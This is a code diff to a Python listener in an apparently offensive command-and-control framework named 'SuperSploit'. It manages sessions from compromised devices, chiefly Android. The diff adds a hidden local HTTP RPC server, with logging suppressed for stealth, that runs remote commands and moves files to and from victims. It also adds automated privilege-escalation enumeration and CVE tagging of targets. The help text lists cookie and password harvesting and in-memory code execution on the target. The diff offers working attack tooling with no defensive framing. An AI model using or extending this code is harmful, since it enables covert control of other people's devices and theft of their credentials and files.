@@ -5,11 +5,14 @@ import struct
 import subprocess
 import threading
 import time
+import json
 import random
 import base64
 import zlib
 import shutil
 import glob
+import datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 from prompt_toolkit import PromptSession
 from prompt_toolkit.history import FileHistory
@@ -28,6 +31,7 @@ class Listener:
     active_listener_socket = None
     active_sessions = {}
     session_counter = 1
+    rpc_server_started = False
 
     @staticmethod
     def send_enc(sock, data):
@@ -84,32 +88,158 @@ class Listener:
         port = database.get("LPORT", database.get("L_PORT", "5000"))
         host = database.get("LHOST", database.get("L_HOST", "0.0.0.0"))
 
-        def handle_client(raw_client, addr, deploy_stage2_flag, stage2_code, context):
-            try:
-                # Enable OS-level TCP Keepalives to handle dropped network packets
-                raw_client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        # --- Local RPC Server for C2 GUI Interop ---
+        if not cls.rpc_server_started:
+            class C2RPCHandler(BaseHTTPRequestHandler):
+                def log_message(self, format, *args):
+                    pass # Suppress HTTP logging for stealth
+                def do_GET(self):
+                    if self.path == "/sessions":
+                        self.send_response(200)
+                        self.send_header('Content-type', 'application/json')
+                        self.end_headers()
+                        sessions = {}
+                        for sid, info in cls.active_sessions.items():
+                            sessions[sid] = {"ip": info["addr"][0], "port": info["addr"][1]}
+                        self.wfile.write(json.dumps(sessions).encode())
+                    else:
+                        self.send_response(404)
+                        self.end_headers()
+
+                def do_POST(self):
+                    try:
+                        content_length = int(self.headers['Content-Length'])
+                        post_data = self.rfile.read(content_length)
+                        req = json.loads(post_data.decode('utf-8'))
+                        sid = int(req.get("session_id", -1))
+                        
+                        if sid not in cls.active_sessions:
+                            self.send_response(404)
+                            self.end_headers()
+                            return
+                            
+                        sess = cls.active_sessions[sid]
+                        sock = sess['socket']
+                        
+                        if self.path == "/cmd":
+                            cmd = req.get("cmd")
+                            sess["busy"] = True
+                            try:
+                                cls.send_enc(sock, cmd)
+                                sock.settimeout(15.0)
+                                resp = cls.recv_enc(sock)
+                                sock.settimeout(None)
+                                out = resp.decode('utf-8', errors='ignore') if resp else ""
+                                self.send_response(200)
+                                self.send_header('Content-type', 'application/json')
+                                self.end_headers()
+                                self.wfile.write(json.dumps({"output": out}).encode())
+                            finally:
+                                sess["busy"] = False
+
+                        elif self.path == "/upload":
+                            remote_path = req.get("remote_path")
+                            file_data = base64.b64decode(req.get("b64_data"))
+                            sess["busy"] = True
+                            try:
+                                cls.send_enc(sock, f"upload {remote_path}")
+                                if b"READY" in cls.recv_enc(sock):
+                                    cls.send_enc(sock, file_data)
+                                    out = cls.recv_enc(sock).decode('utf-8', errors='ignore')
+                                    self.send_response(200)
+                                    self.send_header('Content-type', 'application/json')
+                                    self.end_headers()
+                                    self.wfile.write(json.dumps({"output": out}).encode())
+                                else:
+                                    self.send_response(500)
+                                    self.end_headers()
+                            finally:
+                                sess["busy"] = False
+
+                        elif self.path == "/download":
+                            remote_file = req.get("remote_file")
+                            sess["busy"] = True
+                            try:
+                                cls.send_enc(sock, f"download {remote_file}")
+                                file_data = cls.recv_enc(sock)
+                                if file_data and file_data.startswith(b"ERROR:"):
+                                    out = file_data.decode('utf-8', errors='ignore')
+                                    success = False
+                                elif file_data:
+                                    out = base64.b64encode(file_data).decode('utf-8')
+                                    success = True
+                                else:
+                                    out = "No data received."
+                                    success = False
+                                self.send_response(200)
+                                self.send_header('Content-type', 'application/json')
+                                self.end_headers()
+                                self.wfile.write(json.dumps({"output": out, "success": success}).encode())
+                            finally:
+                                sess["busy"] = False
+
+                        elif self.path == "/kill":
+                            try:
+                                cls.send_enc(sock, "exit")
+                                sock.close()
+                            except: pass
+                            del cls.active_sessions[sid]
+                            self.send_response(200)
+                            self.end_headers()
+                        else:
+                            self.send_response(404)
+                            self.end_headers()
+                    except Exception as e:
+                        self.send_response(500)
+                        self.end_headers()
+
+            def run_rpc():
                 try:
-                    if hasattr(socket, 'TCP_KEEPIDLE'):
-                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
-                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
-                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
-                    elif hasattr(socket, 'TCP_KEEPALIVE'):
-                        # macOS specific TCP keepalive
-                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, 60)
+                    server = HTTPServer(('127.0.0.1', 50050), C2RPCHandler)
+                    cls.rpc_server_started = True
+                    server.serve_forever()
                 except Exception:
                     pass
+            
+            threading.Thread(target=run_rpc, daemon=True).start()
+
+        def handle_client(raw_client, addr, deploy_stage2_flag, stage2_code, context):
+            try:
+                # Trace Redirection for Remote Debugging
+                def trace(msg):
+                    with open("/home/donald/LISTENER_TRACE.log", "a") as tf:
+                        tf.write(f"[{datetime.datetime.now()}] {msg}\n")
+                    write(msg)
+
+                # Enable OS-level TCP Keepalives to handle dropped network packets
+                raw_client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                
+                db = DatabaseManagment.get()
+                active_xor = db.get("XOR_KEY", "SuperSploitKey")
+                trace(f"[*] New connection from {addr[0]}:{addr[1]} (XOR_KEY: {active_xor})")
 
                 # Peek at the first byte to determine if it's a TLS handshake
-                first_byte = raw_client.recv(1, socket.MSG_PEEK)
+                raw_client.settimeout(2.0)
+                try:
+                    first_byte = raw_client.recv(1, socket.MSG_PEEK)
+                    trace(f"[*] Peeked first byte: {repr(first_byte)}")
+                except socket.timeout:
+                    trace(f"[*] Peek timeout from {addr[0]}")
+                    first_byte = b''
+                except Exception as e:
+                    trace(f"[-] Peek error from {addr[0]}: {e}")
+                    first_byte = b''
+                raw_client.settimeout(None)
+
                 if first_byte == b'\x16': # TLS Handshake (ClientHello)
                     client = context.wrap_socket(raw_client, server_side=True)
-                    write(f"\n\n[+] Secure TLS connection established from {addr[0]}:{addr[1]}")
+                    trace(f"[+] Secure TLS connection established from {addr[0]}:{addr[1]}")
                 else:
                     client = raw_client
-                    write(f"\n\n[+] Unencrypted TCP connection established from {addr[0]}:{addr[1]}")
+                    trace(f"[+] Unencrypted TCP connection established from {addr[0]}:{addr[1]}")
 
 
-                if deploy_stage2_flag:
+                if deploy_stage2_flag and first_byte == b'\x16':
                     write("[*] Connection caught! Packaging and encrypting Stage 2 in-memory C2...")
                     
                     try:
@@ -192,9 +322,13 @@ class Listener:
                     pass
                 client.settimeout(None)
 
-                # Trigger automated enumeration in the background
-                if database.get("AUTO_ENUM", "true").lower() == "true":
-                    threading.Thread(target=cls._auto_enumerate, args=(client, addr, session_id, database), daemon=True).start()
+                # Trigger automated enumeration in the background (Pro Feature)
+                if str(database.get("AUTO_ENUM", "true")).lower() == "true":
+                    from .license_manager import LicenseManager
+                    if LicenseManager.check_pro_status():
+                        threading.Thread(target=cls._auto_enumerate, args=(client, addr, session_id, database), daemon=True).start()
+                    else:
+                        write("[*] Skipping Automated Enumeration (SuperSploit Pro feature).\n")
 
             except Exception as e:
                 import traceback
@@ -384,6 +518,12 @@ class Listener:
             arch_raw = cls.recv_enc(client)
             arch = arch_raw.decode('utf-8', errors='ignore').strip() if arch_raw else "aarch64"
             
+            # Sync the framework's global database to the true device architecture
+            database.set("ARCH", arch)
+            if int(session_id) in cls.active_sessions:
+                cls.active_sessions[int(session_id)]["arch"] = arch
+                cls.active_sessions[int(session_id)]["os_family"] = "Android"
+
             # 3. Compile or find enumeration tool
             install = DatabaseManagment.getInstall()
             tool_source = os.path.join(install, "source", "tools", "android-enum3.c")
@@ -448,6 +588,15 @@ class Listener:
                     if not profile:
                         profile = {"name": model or ip, "ip": ip, "research": []}
                     
+                    # Bind the true device architecture and OS to the target profiles
+                    profile["os_family"] = "Android"
+                    profile["architecture"] = arch
+                    
+                    targets = DatabaseManagment.getTargets()
+                    if ip not in targets: targets[ip] = {}
+                    targets[ip]["os_family"] = "Android"
+                    targets[ip]["architecture"] = arch
+
                     key_points = []
                     for line in report.split('\n'):
                         if "[!]" in line or "CRITICAL" in line or "INFO LEAK" in line:
@@ -672,7 +821,6 @@ class Listener:
   find_cookies        Search for all cookie databases on device (Root only)
   find_passwords       Search for all password/credential stores (Root only)
   lpe_enum            Automated LPE audit with exploit suggestions
-  auto_root           Attempt silent privilege escalation (Rootkit only)
 
 [ PYTHON MEMORY EXECUTION ]
   exec(<code>)        Evaluate Python code directly in target's RAM
@@ -782,6 +930,45 @@ class Listener:
         return "continue"
 
     @classmethod
+    def _tag_profile_vulnerabilities(cls, target_ip, cves):
+        """Automatically appends discovered CVEs to the target's persistent research log."""
+        if not cves: return
+        
+        # 1. Find or create the profile
+        profiles = DatabaseManagment.getProfiles()
+        target_profile = None
+        profile_name = None
+
+        # Look for matching IP in profiles
+        for name, data in profiles.items():
+            if data.get("ip") == target_ip or data.get("name") == target_ip:
+                target_profile = data
+                profile_name = name
+                break
+        
+        if not target_profile:
+            # Create a basic profile if one doesn't exist
+            write(f"[*] Creating new profile for {target_ip} for automated tagging...\n")
+            target_profile = DatabaseManagment.importFromTargets(target_ip)
+            if not target_profile: return
+            profile_name = target_profile["name"]
+
+        # 2. Append CVEs to research
+        research = target_profile.get("research", [])
+        added_count = 0
+        for cve in cves:
+            tag = f"[Auto-Tag] Found {cve} via enumeration"
+            if tag not in research:
+                research.append(tag)
+                added_count += 1
+        
+        if added_count > 0:
+            target_profile["research"] = research
+            # We must use DatabaseManagment.addProfile which expects a dict and saves it
+            DatabaseManagment.addProfile(target_profile)
+            write(f"[+] Automated Tagging: {added_count} new vulnerabilities logged to profile '{profile_name}'.\n")
+
+    @classmethod
     def _cmd_remote(cls, client, session_id, cmd):
         """Handles commands not natively recognized by the C2 client by passing them to the remote agent."""
         cls.send_enc(client, cmd)
@@ -821,4 +1008,15 @@ class Listener:
             return "continue"
 
         print(decoded_data, end="")
+
+        # --- AUTOMATED VULNERABILITY TAGGING ---
+        if cmd == "lpe_enum":
+            import re
+            cves = re.findall(r"(CVE-\d{4}-\d{4,7})", decoded_data)
+            if cves:
+                cves = list(set(cves)) # Dedup
+                target_info = cls.active_sessions.get(int(session_id), {})
+                target_ip = target_info.get("addr", ["Unknown"])[0]
+                cls._tag_profile_vulnerabilities(target_ip, cves)
+
         return "continue"
